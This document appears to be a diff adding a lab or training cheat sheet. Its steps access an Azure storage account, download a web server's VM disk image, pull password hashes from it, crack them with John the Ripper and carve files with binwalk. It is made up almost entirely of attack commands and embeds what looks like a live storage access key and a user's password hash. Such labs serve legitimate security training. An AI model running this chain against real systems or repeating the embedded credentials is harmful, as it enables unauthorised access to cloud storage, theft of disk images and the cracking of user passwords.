@@ -1,0 +1,45 @@
+~~~ Access Storage Account ~~~
+
+cd /shared
+
+docker run -v /shared:/shared --entrypoint /bin/bash -ti cnoio/azureclione
+
+cd /shared
+
+export AZURE_STORAGE_ACCOUNT=rg001disks543
+
+export AZURE_STORAGE_ACCESS_KEY=Fp8UbW1vikJnSYBHpTFqjUh2u8fP+qPqbhrQyBmHX2uhRiAqGoLDcNwiybwz5FRDx4l5M0J1VlGhZ2tje3IkRQ==
+
+azure storage container list
+
+
+~~~ Access VM Through HD ~~~
+
+azure storage blob list --container vhds
+
+azure storage blob download --container vhds --blob webserver00120180710100306.vhd
+
+strings webserver00120180710100306.vhd | grep ":0:99999:"
+
+
+~~~ Use John The Ripper ~~~
+
+john
+
+echo 'moss:$6$ghMzwPYh$.EIMM9RCinMbhZ7mTdFx2GoHZyW3U.6DXRiJeJI2acmSsECJb9N8HP1HCaoiFwed/5IWoR7uYqz23/hz86WRF.:17722:0:99999:7:::' > hashes.txt
+
+cd /shared/lists
+
+wget https://raw.githubusercontent.com/cno-io/SecLists/master/Passwords/probable-v2-top207.txt
+
+cd /shared/
+
+cat /shared/hashes.txt
+
+john --fork=4 --wordlist=/shared/lists/probable-v2-top207.txt /shared/hashes.txt
+
+
+~~~ Carve files ~~~
+
+binwalk -Mre webserver00120180710100306.vhd
+
